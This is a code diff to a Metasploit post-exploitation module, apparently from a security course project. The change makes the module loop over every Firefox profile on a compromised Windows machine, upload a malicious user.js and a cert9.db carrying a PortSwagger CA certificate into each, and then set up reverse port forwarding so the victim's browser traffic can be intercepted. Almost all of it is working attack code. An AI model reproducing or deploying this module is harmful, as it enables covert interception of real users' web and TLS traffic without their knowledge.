@@ -40,9 +40,21 @@ class MetasploitModule < Msf::Post
       print_error "I am not Admin!"
     end
 
+    # Find all the Firefox profiles
+    directory = 'c:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\\'
+    dirs = dir(directory)
+    if dirs.nil?
+	print_error "Something went wrong"
+    else
+	dirs.each {|a| print_status a}
+    end
+
+    for i in dirs
+	if i != "." and i != ".."
+
     # Attempt to write the user.js file
-    print_status("Uploading a malicious preference file")
-    res = upload_file('c:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\cr3z9a1y.default-1523519120958\user.js', '/root/itp325/browser-pivot/user.js')
+    print_status("Uploading a malicious preference file at #{i}")
+    res = upload_file("c:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{i}\\user.js", '/root/itp325/browser-pivot/user.js')
     if res.nil?
 	print_error "Upload failed"
     else
@@ -50,15 +62,20 @@ class MetasploitModule < Msf::Post
     end
 
     # Upload PortSwagger CA to victim
-    print_status("Uploading malicious Certificate")
-    res = upload_file('c:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\cr3z9a1y.default-1523519120958\cert9.db', '/root/itp325/browser-pivot/cert9.db')
+    print_status("Uploading malicious Certificate at #{i}")
+    res = upload_file("c:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{i}\\cert9.db", '/root/itp325/browser-pivot/cert9.db')
     if res.nil?
 	print_error "Upload failed"
     else
 	print_good "Upload successful"
     end
 
+    print_status(" ")
+
     # Find a way to forward the response back to the victim
+
+	end
+    end
 
     # Attempt to open port forwarding
     print_status("Starting reverse port forwarding")
